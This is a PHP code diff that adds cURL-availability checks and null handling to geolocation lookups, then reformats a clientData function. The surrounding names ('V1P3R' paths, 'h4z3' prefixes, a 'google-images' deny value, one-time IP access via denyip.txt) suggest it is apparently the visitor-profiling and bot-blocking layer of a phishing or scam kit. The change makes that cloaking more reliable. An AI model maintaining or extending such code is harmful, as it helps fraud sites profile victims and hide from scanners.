@@ -21,6 +21,13 @@ function getUserIP()
     return $ip;
 }
 
+function h4z3_can_use_curl()
+{
+    return function_exists('curl_init')
+        && function_exists('curl_setopt')
+        && function_exists('curl_exec');
+}
+
 function h4z3_is_toggle_enabled($value)
 {
     if ($value === null) {
@@ -481,6 +488,10 @@ if($ip == "127.0.0.1") {
 }
 ###########################################################
 function get_ip1($ip2) {
+    if (!h4z3_can_use_curl()) {
+        return null;
+    }
+
     $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
     $ch = curl_init();
     curl_setopt($ch,CURLOPT_URL,$url);
@@ -489,10 +500,18 @@ function get_ip1($ip2) {
     curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
     $resp=curl_exec($ch);
     curl_close($ch);
+    if ($resp === false) {
+        return null;
+    }
+
     return $resp;
 }
 ###########################################################
 function get_ip2($ip) {
+    if (!h4z3_can_use_curl()) {
+        return null;
+    }
+
     $url = 'http://extreme-ip-lookup.com/json/' . $ip;
     $ch = curl_init();
     curl_setopt($ch,CURLOPT_URL,$url);
@@ -501,27 +520,55 @@ function get_ip2($ip) {
     curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
     $resp=curl_exec($ch);
     curl_close($ch);
+    if ($resp === false) {
+        return null;
+    }
+
     return $resp;
 }
 ###########################################################
 $details = get_ip1($ip2);
-$details = json_decode($details, true);
-if (!is_array($details)) {
-    error_log('GeoPlugin response decoding failed or returned no data.');
+
+if ($details === null) {
+    if (!h4z3_can_use_curl()) {
+        trigger_error('Geolocation skipped because cURL is disabled.', E_USER_NOTICE);
+    }
+
     $details = [];
+    $countryname = '';
+    $countrycode = '';
+    $data="../V1P3R/img/icon.ico";$deny='google-images';
+    $cn = '';
+    $cid = '';
+    $continent = '';
+    $citykota = '';
+    $regioncity = '';
+    $timezone = '';
+    $kurenci = '';
+} else {
+    $details = json_decode($details, true);
+    if (!is_array($details)) {
+        error_log('GeoPlugin response decoding failed or returned no data.');
+        $details = [];
+    }
+    $countryname = $details['geoplugin_countryName'] ?? '';
+    $countrycode = $details['geoplugin_countryCode'] ?? '';
+    $data="../V1P3R/img/icon.ico";$deny='google-images';
+    $cn = $countryname;
+    $cid = $countrycode;
+    $continent = $details['geoplugin_continentName'] ?? '';
+    $citykota = $details['geoplugin_city'] ?? '';
+    $regioncity = $details['geoplugin_region'] ?? '';
+    $timezone = $details['geoplugin_timezone'] ?? '';
+    $kurenci = $details['geoplugin_currencySymbol_UTF8'] ?? '';
+
+    $secondaryDetails = get_ip2($ip2);
+    if ($secondaryDetails === null) {
+        $details = [];
+    } else {
+        $details = json_decode($secondaryDetails, true);
+    }
 }
-$countryname = $details['geoplugin_countryName'] ?? '';
-$countrycode = $details['geoplugin_countryCode'] ?? '';
-$data="../V1P3R/img/icon.ico";$deny='google-images';
-$cn = $countryname;
-$cid = $countrycode;
-$continent = $details['geoplugin_continentName'] ?? '';
-$citykota = $details['geoplugin_city'] ?? '';
-$regioncity = $details['geoplugin_region'] ?? '';
-$timezone = $details['geoplugin_timezone'] ?? '';
-$kurenci = $details['geoplugin_currencySymbol_UTF8'] ?? '';
-$details = get_ip2($ip2);
-$details = json_decode($details, true);
 ###########################################################
 function getIp() {
 	    foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
@@ -540,43 +587,47 @@ function getIp() {
 	}
 ###########################################################
 function clientData($ss) {
-	   	$ch = curl_init();
-	   	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-	   	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-	   	curl_setopt($ch, CURLOPT_URL,"http://www.geoplugin.net/json.gp?ip=".getIp());
-	   	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0); 
-		curl_setopt($ch, CURLOPT_TIMEOUT, 400);
-	   	$json = curl_exec($ch);
-	   	curl_close($ch);
-	   	
-	    if ($json == false) {
-	        return "127.0.0.1";
-	    }
-	   	$code = json_decode($json);
-	    switch ($ss) {
-	        case "code":
-	            $str = $code->geoplugin_countryCode;
-	            break;
-	        case "country":
-	            $str = $code->geoplugin_countryName;
-	            break;
-	        case "city":
-	            $str = $code->geoplugin_city;
-	            break;
-	        case "state":
-	            $str = $code->geoplugin_region;
-	            break;
-	        case "timezone":
-	            $str = $code->geoplugin_timezone;
-	            break;
-	        case "currency":
-	            $str = $code->geoplugin_currencyCode;
-	            break;
-	        default:
-	            $str = $code->geoplugin_request;
-	    }
-	   	return $str;
-	}
+                if (!h4z3_can_use_curl()) {
+                    return null;
+                }
+
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                curl_setopt($ch, CURLOPT_URL,"http://www.geoplugin.net/json.gp?ip=".getIp());
+                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
+                curl_setopt($ch, CURLOPT_TIMEOUT, 400);
+                $json = curl_exec($ch);
+                curl_close($ch);
+
+            if ($json == false) {
+                return "127.0.0.1";
+            }
+                $code = json_decode($json);
+            switch ($ss) {
+                case "code":
+                    $str = $code->geoplugin_countryCode;
+                    break;
+                case "country":
+                    $str = $code->geoplugin_countryName;
+                    break;
+                case "city":
+                    $str = $code->geoplugin_city;
+                    break;
+                case "state":
+                    $str = $code->geoplugin_region;
+                    break;
+                case "timezone":
+                    $str = $code->geoplugin_timezone;
+                    break;
+                case "currency":
+                    $str = $code->geoplugin_currencyCode;
+                    break;
+                default:
+                    $str = $code->geoplugin_request;
+            }
+                return $str;
+        }
 ###########################################################
 function accessOneTimeIP($ip){
 	$text = file_get_contents("denyip.txt");
